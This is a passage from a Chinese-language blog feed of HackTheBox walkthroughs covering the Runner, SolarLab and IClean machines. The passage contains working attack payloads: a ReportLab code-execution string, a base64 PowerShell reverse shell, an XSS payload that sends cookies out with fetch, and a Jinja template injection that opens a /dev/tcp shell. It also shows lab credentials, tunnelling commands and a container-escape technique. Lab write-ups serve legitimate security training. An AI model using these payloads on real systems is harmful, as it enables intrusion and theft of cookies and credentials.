class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cewl http://runner.htb &gt; wordlist.txt</span><br><span class="line">ffuf -w wordlist.txt -u http://runner.htb -H &quot;HOST: FUZZ.runner.htb&quot; -mc all -fc 302</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/202408131744323.png" alt="202408131744323img"></p><p>添加hosts</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;10.10.11.13 teamcity.runner.htb&quot; | sudo tee -a /etc/host</span><br></pre></td></tr></table></figure><p>runner.htb</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1723543582097.png" alt="截屏2024-08-13 17.53.37"></p><p>teamcity.runner.htb</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1723543577689.png" alt="截屏2024-08-13 17.53.49"></p><p>Google search</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1723618225407.png" alt="image-20240814145019797"></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1723618601553.png" alt="image-20240814145641499"></p><h2 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h2><p>测试功能，Backup能备份文件且能下载</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1723711668613.png" alt="截屏2024-08-15 16.23.20"></p><p>config&#x2F;projects&#x2F;AllProjects&#x2F;pluginData&#x2F;ssh_keys&#x2F;id_rsa</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1723712031741.png" alt="image-20240815165351687"></p><p>database_dump&#x2F;users</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1723712715059.png" alt="image-20240815170515031"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">john@runner.htb</span><br><span class="line">matthew@runner.htb</span><br></pre></td></tr></table></figure><p>ssh</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 id_rsa</span><br><span class="line">ssh -i id_rsa john@runner.htb</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1723713424348.png" alt="image-20240815171704301"></p><p>端口开放情况，portainer:9000 , teamcity:8111 -&gt;80</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1723779368955.png" alt="截屏2024-08-16 11.35.44"></p><h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><h3 id="chisel"><a href="#chisel" class="headerlink" title="chisel"></a>chisel</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">传文件</span></span><br><span class="line">python3 -m http.server 80</span><br><span class="line">wget http://10.10.16.41/chisel</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kali</span></span><br><span class="line">./chisel server -p 3000 --reverse</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">靶机</span></span><br><span class="line">./chisel client 10.10.16.41:3000 R:9000:127.0.0.1:9000</span><br></pre></td></tr></table></figure><p>需要登陆，下载的users文件中还有用户，尝试破解</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1723780405605.png" alt="截屏2024-08-16 11.53.10"></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1723780354220.png" alt="截屏2024-08-16 11.52.06"></p><p>登陆portainer后，根据两篇文章解</p><p><a href="https://nitroc.org/en/posts/cve-2024-21626-illustrated/?source=post_page-----64ed8bf080f4--------------------------------#exploit-via-setting-working-directory-to-procselffdfd">CVE-2024-21626</a></p><p><a href="https://medium.com/@chaudharijugal07/runner-walkthrough-hackthebox-64ed8bf080f4">https://medium.com/@chaudharijugal07/runner-walkthrough-hackthebox-64ed8bf080f4</a></p><p>Docker, Image 里有两个镜像</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1723778986085.png" alt="截屏2024-08-16 11.29.30"></p><p>创建一个容器</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1723778891497.png" alt="截屏2024-08-16 11.13.00"></p><p>工作目录设置 <code>/proc/self/fd/8</code></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1723778872939.png" alt="截屏2024-08-16 11.19.31"></p><p>进入0721容器</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1723778828122.png" alt="截屏2024-08-16 11.22.05"></p><p>连接root</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1723778838123.png" alt="截屏2024-08-16 11.21.50"></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1723778802740.png" alt="截屏2024-08-16 11.26.07"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB SolarLab</title>
      <link href="/2024/07/31/writeup/htb/HTB%20SolarLab/"/>
      <url>/2024/07/31/writeup/htb/HTB%20SolarLab/</url>
      
        <content type="html"><![CDATA[<h1 id="SolarLab-Windows-·-Medium"><a href="#SolarLab-Windows-·-Medium" class="headerlink" title="SolarLab (Windows · Medium)"></a>SolarLab (Windows · Medium)</h1><p>CVE-2023-33733 + CVE-2023-32315</p><h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><p>添加hosts</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.16solarLab.htb</span><br></pre></td></tr></table></figure><h3 id="namp"><a href="#namp" class="headerlink" title="namp"></a>namp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p- -v -T4 solarlab.htb</span><br><span class="line"></span><br><span class="line">Nmap scan report for solarlab.htb (10.10.11.16)</span><br><span class="line">Host is up (0.28s latency).</span><br><span class="line">Not shown: 65530 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">80/tcp   open  http          nginx 1.24.0</span><br><span class="line">|_http-server-header: nginx/1.24.0</span><br><span class="line">|_http-title: SolarLab Instant Messenger</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">6791/tcp open  http          nginx 1.24.0</span><br><span class="line">|_http-server-header: nginx/1.24.0</span><br><span class="line">|_http-title: Did not follow redirect to http://report.solarlab.htb:6791/</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2024-07-23T04:44:44</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">|_clock-skew: -8m12s</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>80正常访问，6791跳转到report.solarlab.htb:6791，添加hosts</p><p>445 SMB</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240723143120987.png" alt="image-20240723143120987"></p><p>details-file.xlsx</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240723143222270.png" alt="image-20240723143222270"></p><h3 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a>gobuster</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gobuster dns -d solarlab.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 100</span><br><span class="line">Nothing</span><br></pre></td></tr></table></figure><h3 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://solarlab.htb/</span><br><span class="line">Nothing</span><br><span class="line">dirsearch -u http://report.solarlab.htb:6791/</span><br><span class="line">Nothing</span><br></pre></td></tr></table></figure><p>solarlab.htb</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240723130845288.png" alt="image-20240723130845288"></p><p>report.solarlab.htb:6791</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240723130906563.png" alt="image-20240723130906563"></p><p>通过SMB获取的xlsx数据爆破</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240723144553010.png" alt="image-20240723144553010"></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240723144522690.png" alt="image-20240723144522690"></p><p>没有爆破出来，看网上wp是 BlakeB:ThisCanB3typedeasily1@ (缩写)</p><h2 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h2><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240723150029165.png" alt="image-20240723150029165"></p><p>有四个功能，都能生成 PDF，搜索相关漏洞</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240723145839535.png" alt="image-20240723145839535"></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240723150617112.png" alt="image-20240723150617112"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;para&gt;&lt;font color=&quot;[[[getattr(pow, Word(&#x27;__globals__&#x27;))[&#x27;os&#x27;].system(&#x27;curl http://10.10.16.30&#x27;) for Word in [ orgTypeFun( &#x27;Word&#x27;, (str,), &#123; &#x27;mutated&#x27;: 1, &#x27;startswith&#x27;: lambda self, x: 1 == 0, &#x27;__eq__&#x27;: lambda self, x: self.mutate() and self.mutated &lt; 0 and str(self) == x, &#x27;mutate&#x27;: lambda self: &#123; setattr(self, &#x27;mutated&#x27;, self.mutated - 1) &#125;, &#x27;__hash__&#x27;: lambda self: hash(str(self)), &#125;, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and &#x27;red&#x27;&quot;&gt;</span><br><span class="line">                exploit</span><br><span class="line">&lt;/font&gt;&lt;/para&gt;</span><br></pre></td></tr></table></figure><p>测试</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240723155557565.png" alt="image-20240723155557565"></p><p>反弹shell，工具生成powershell</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240723160458541.png" alt="image-20240723160458541"></p><p>User flag: C:\Users\blake\Desktop\user.txt</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240731164556823.png" alt="image-20240731164556823"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">blakeb:ThisCanB3typedeasily1@ </span><br><span class="line">alexanderk:HotP!fireguard </span><br><span class="line">claudias:007poiuytrewq</span><br></pre></td></tr></table></figure><p>C:Users 下发现了 openfire</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240801125828555.png" alt="image-20240801125828555"></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240731164758899.png" alt="image-20240731164758899"></p><h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240731171843212.png" alt="image-20240731171843212"></p><p>传 chisel.exe</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kali</span></span><br><span class="line">python3 -m http.server</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">靶机</span></span><br><span class="line">Invoke-WebRequest -Uri &quot;http://10.10.16.30/chisel.exe&quot; -OutFile &quot;C:\Users\blake\Documents\chisel.exe&quot;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240801103203530.png" alt="image-20240801103203530"></p><h3 id="chisel"><a href="#chisel" class="headerlink" title="chisel"></a>chisel</h3><p>反向代理</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./chisel server -p 12345 --reverse --socks5# kali</span><br><span class="line">./chisel.exe client 10.10.16.30:12345 R:9090:127.0.0.1:9090# 靶机</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240801111454668.png" alt="image-20240801111454668"></p><p>google search</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240801111647520.png" alt="image-20240801111647520"></p><p>找到一个身份验证绕过的，利用</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240801111924887.png" alt="image-20240801111924887"></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240801112541646.png" alt="image-20240801112541646"></p><p>继续利用CVE</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240801112526895.png" alt="image-20240801112526895"></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240801112611649.png" alt="image-20240801112611649"></p><p>切换到 system command 就可以RCE了</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240801112916526.png" alt="image-20240801112916526"></p><p>反弹shell，工具生成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwAwACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==</span><br><span class="line"></span><br><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240801113437327.png" alt="image-20240801113437327"></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>embedded-db，有数据库先看，C:\Program Files\Openfire\embedded-db\openfire.script</p><p>从OFUSER表结构来看，有明文密码，也有加密密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE MEMORY TABLE PUBLIC.OFUSER(USERNAME VARCHAR(64) NOT NULL,STOREDKEY VARCHAR(32),SERVERKEY VARCHAR(32),SALT VARCHAR(32),ITERATIONS INTEGER,PLAINPASSWORD VARCHAR(32),ENCRYPTEDPASSWORD VARCHAR(255),NAME VARCHAR(100),EMAIL VARCHAR(100),CREATIONDATE VARCHAR(15) NOT NULL,MODIFICATIONDATE VARCHAR(15) NOT NULL,CONSTRAINT OFUSER_PK PRIMARY KEY(USERNAME))</span><br></pre></td></tr></table></figure><p>admin</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO OFUSER VALUES(&#x27;admin&#x27;,&#x27;gjMoswpK+HakPdvLIvp6eLKlYh0=&#x27;,&#x27;9MwNQcJ9bF4YeyZDdns5gvXp620=&#x27;,&#x27;yidQk5Skw11QJWTBAloAb28lYHftqa0x&#x27;,4096,NULL,&#x27;becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442&#x27;,&#x27;Administrator&#x27;,&#x27;admin@solarlab.htb&#x27;,&#x27;001700223740785&#x27;,&#x27;0&#x27;)</span><br></pre></td></tr></table></figure><p>google search，找解密脚本</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240801114349067.png" alt="image-20240801114349067"></p><p>还需要一个key</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO OFPROPERTY VALUES(&#x27;passwordKey&#x27;,&#x27;hGXiFzsKaAeYLjn&#x27;,0,NULL)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240801120851215.png" alt="image-20240801120851215"></p><h3 id="impacket-smbexec"><a href="#impacket-smbexec" class="headerlink" title="impacket-smbexec"></a>impacket-smbexec</h3><p>连接，不能使用 cd</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">impacket-smbexec administrator:&#x27;ThisPasswordShouldDo!@&#x27;@solarlab.htb</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">[-] You can<span class="string">&#x27;t CD under SMBEXEC. Use full paths.</span></span></span><br><span class="line">type C:\Users\Administrator\Desktop\root.txt</span><br></pre></td></tr></table></figure><h3 id="evil-winrm"><a href="#evil-winrm" class="headerlink" title="evil-winrm"></a>evil-winrm</h3><p>连不上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.11.16 -u administrator -p &#x27;ThisPasswordShouldDo&#x27;</span><br></pre></td></tr></table></figure><h3 id="RunasCS"><a href="#RunasCS" class="headerlink" title="RunasCS"></a>RunasCS</h3><p>通过powershell传到靶机上</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Invoke-WebRequest -Uri http://10.10.16.30/RunasCs.exe -OutFile C:\Users\blake\Documents\RunasCs.exe</span><br><span class="line"></span><br><span class="line">./RunasCs.exe administrator ThisPasswordShouldDo!@ powershell -r 10.10.16.30:6666</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240801125558440.png" alt="image-20240801125558440"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB IClean</title>
      <link href="/2024/07/26/writeup/htb/HTB%20IClean/"/>
      <url>/2024/07/26/writeup/htb/HTB%20IClean/</url>
      
        <content type="html"><![CDATA[<h1 id="IClean-Linux-·-Medium"><a href="#IClean-Linux-·-Medium" class="headerlink" title="IClean (Linux · Medium)"></a>IClean (Linux · Medium)</h1><p>SSTI + <a href="https://qpdf.readthedocs.io/en/stable/cli.htm">qpdf</a></p><h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -v -T4 10.10.11.12</span><br><span class="line"></span><br><span class="line">Nmap scan report for capiclean.htb (10.10.11.12)</span><br><span class="line">Host is up (0.28s latency).</span><br><span class="line">Not shown: 976 closed tcp ports (conn-refused)</span><br><span class="line">PORT      STATE    SERVICE          VERSION</span><br><span class="line">22/tcp    open     ssh              OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 2c:f9:07:77:e3:f1:3a:36:db:f2:3b:94:e3:b7:cf:b2 (ECDSA)</span><br><span class="line">|_  256 4a:91:9f:f2:74:c0:41:81:52:4d:f1:ff:2d:01:78:6b (ED25519)</span><br><span class="line">80/tcp    open     http             Apache httpd 2.4.52 ((Ubuntu))</span><br><span class="line">|_http-favicon: Unknown favicon MD5: 59A6DBEA095D69E461CAC2D85CE6999A</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: HEAD OPTIONS GET</span><br><span class="line">|_http-title: Capiclean</span><br><span class="line">| http-server-header: </span><br><span class="line">|   Apache/2.4.52 (Ubuntu)</span><br><span class="line">|_  Werkzeug/2.3.7 Python/3.10.12</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>访问<code>10.10.11.12</code>，重定向到<code>capiclean.htb</code>，添加hosts</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;10.10.11.12 capiclean.htb&quot; | sudo tee -a /etc/hosts</span><br></pre></td></tr></table></figure><h3 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a>gobuster</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gobuster vhost -u http://capiclean.htb/ --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</span><br><span class="line">Nothing</span><br></pre></td></tr></table></figure><h3 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u capiclean.htb</span><br><span class="line">/login</span><br><span class="line">/quote</span><br><span class="line">/dashboard302</span><br></pre></td></tr></table></figure><p>capiclean.htb&#x2F;quote</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240730143554120.png" alt="image-20240730143554120"></p><p>抓包，发现请求路径变成了&#x2F;sendMessage</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240730143751635.png" alt="image-20240730143751635"></p><p>对其参数进行测试，最终测试XSS成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=fetch(&quot;http://10.10.16.38:8000/&quot;+document.cookie);&gt;</span><br><span class="line"></span><br><span class="line"># urlencode</span><br><span class="line">service=&lt;img+src%3dx+onerror%3dfetch(&quot;http%3a//10.10.16.38:8000/&quot;%2bdocument.cookie)%3b&gt;</span><br><span class="line"></span><br><span class="line"># payload</span><br><span class="line">&lt;img+src%3dx+onerror%3dfetch(&quot;http%3a//10.10.16.38:8000/&quot;%2bdocument.cookie)%3b&gt;&amp;email=aaaaaa%40aa.a</span><br><span class="line"></span><br><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure><p>接受到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZqfzSw.KpFwmEyKO76EyEMzWmsW-mWq_XA</span><br></pre></td></tr></table></figure><p>添加Cookie，访问&#x2F;dashboard</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240730145735557.png" alt="image-20240730145735557"></p><p>&#x2F;InvoiceGenerator，输入参数后会生成一个<code>Invoice ID generated</code>，对其参数进行测试无果</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240730150118705.png" alt="image-20240730150118705"></p><p>&#x2F;QRGenerator，输入Generate QR后会出现下面的输入框，都对其进行测试</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240731144418899.png" alt="image-20240731144418899"></p><h2 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h2><p>qr_link进行测是发现SSTI</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240731144600755.png" alt="image-20240731144600755"></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;request|attr(&quot;application&quot;)|attr(&quot;\x5f\x5fglobals\x5f\x5f&quot;)|attr(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(&quot;\x5f\x5fbuiltins\x5f\x5f&quot;)|attr(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(&quot;\x5f\x5fimport\x5f\x5f&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;bash+-c+&#x27;/bin/bash+-i+&gt;%26+/dev/tcp/10.10.16.38/4444+0&gt;%261&#x27;&quot;)|attr(&quot;read&quot;)()&#125;&#125;</span><br></pre></td></tr></table></figure><p>app.py，拿到数据库凭据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iclean:pxCsmnGLckUb</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240731152220685.png" alt="image-20240731152220685"></p><p>不是交互式也可以用 -e参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uiclean -ppxCsmnGLckUb -e &#x27;show databases;&#x27;</span><br></pre></td></tr></table></figure><p>查有bash权限的用户</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240731153010697.png" alt="image-20240731153010697"></p><h3 id="hash-identifier"><a href="#hash-identifier" class="headerlink" title="hash-identifier"></a>hash-identifier</h3><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-20240731152312028.png" alt="image-20240731152312028"></p><h3 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 